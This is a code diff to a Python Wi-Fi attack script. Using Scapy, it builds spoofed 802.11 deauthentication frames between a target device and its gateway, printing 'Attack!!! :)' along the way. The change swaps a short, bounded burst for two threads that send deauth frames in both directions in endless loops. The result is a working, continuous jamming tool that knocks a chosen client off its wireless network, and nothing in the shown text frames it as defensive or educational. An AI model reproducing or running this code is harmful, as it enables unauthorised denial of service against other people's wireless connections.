@@ -61,6 +61,13 @@ def change_channel():
             break
 
 
+def for_ap(frame, interface):
+  while True:
+    sendp(frame, iface = interface, count = 100, inter = 0.1)
+def for_client(frame, interface):
+  while True:
+    sendp(frame, iface = interface, count = 100, inter = 0.1)
+
 if __name__ == "__main__":
 
     # 1. Get network interface card names & print
@@ -140,9 +147,12 @@ if __name__ == "__main__":
     print('Attack!!! :)')
     frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=1)
     frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=1)
-    for i in range(10):
-        sendp(frame, iface=interface, count=10, inter=0.1)
-        sendp(frame1, iface=interface, count=10, inter=0.1)
+    st = threading.Thread(target = for_ap, args = (frame, interface))
+    lt = threading.Thread(target = for_client, args = (frame1, interface))
+    st.start()
+    lt.start()
+    st.join()
+    lt.join()
 
     # 12. Disable monitor mode
     os.system(f'sudo ifconfig {interface} down')
